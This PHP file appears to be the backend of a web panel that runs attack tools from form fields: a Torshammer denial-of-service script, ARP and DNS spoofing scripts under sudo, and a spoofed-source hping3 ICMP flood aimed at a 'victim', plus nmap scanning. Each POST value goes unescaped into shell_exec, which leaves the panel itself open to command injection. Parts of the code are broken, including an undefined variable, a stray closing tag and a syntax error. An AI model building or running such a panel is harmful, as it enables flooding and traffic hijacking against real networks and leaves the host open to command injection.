<?php
  // Use ls command to shell_exec
  // function
  $DDOS = 'nmap'." ".$_POST['OPCION']." ".$_POST['VELOCIDAD']." ".$_POST['HOST_NMAP'];

  if (isset($_POST['NMAP']))
  {
    print_r($NMAP);
    print(shell_exec($NMAP));
  }



?>

<?php
  // Use ls command to shell_exec
  // function
  $DDOS = 'python2 scripts/Torshammer/torshammer.py -t'." ".$_POST['IP']." ".'-p'." ".$_POST['PORT']." ".'-r'." ".$_POST['RE'];

  if (isset($_POST['DDOS']))
  {
    print_r($DDOS);
    shell_exec($DDOS);
  }

   if(isset($_POST['DDOS-stop']))
     {
       shell_exec("kill -9 `pidof python2`");
     }


?>

<?php

  // Use ls command to shell_exec
  // function
  $ARPSPOOFING = 'sudo python3 scripts/arp_spoofing.py '.$_POST['IP-V']." ".$_POST['IP-P'];

  // $ARPSPOOFING = 'sudo python3 scripts/arp_spoofing.py 192.168.12.117 192.168.12.10';

  if (isset($_POST['ARPSPOOFING']))
  {
    print_r($ARPSPOOFING);
    shell_exec($ARPSPOOFING);

  }

   if(isset($_POST['ARPSPOOFING-stop']))
     {
       shell_exec("sudo kill -9 `pidof python3`");
     }

?>

?>

<?php

  // Use ls command to shell_exec
  // function
   $DNSSPOOFING = 'sudo python3 scripts/dns_spoofing.py '.$_POST['ORIGINAL-DOMAIN']." ".$_POST['FALSE-DOMAIN'];


  if (isset($_POST['DNSSPOOFING']))
  {
    print_r($DNSSPOOFING);
    shell_exec($DNSSPOOFING);

  }

   if(isset($_POST['DNSSPOOFING-stop']))
     {
       shell_exec("sudo kill -9 `pidof python3`");
     }

?>

<?php

  // Use ls command to shell_exec
  // function
   $SMURF = 'sudo hping3 -1 --flood -a '.$_POST['ZOMBI']." "..$_POST['VICTIMA'];


  if (isset($_POST['SMURF']))
  {
    print_r($SMURF);
    shell_exec($SMURF);

  }

   if(isset($_POST['$SMURF-stop']))
     {
       shell_exec("sudo kill -9 `pidof hping3`");
     }

?>
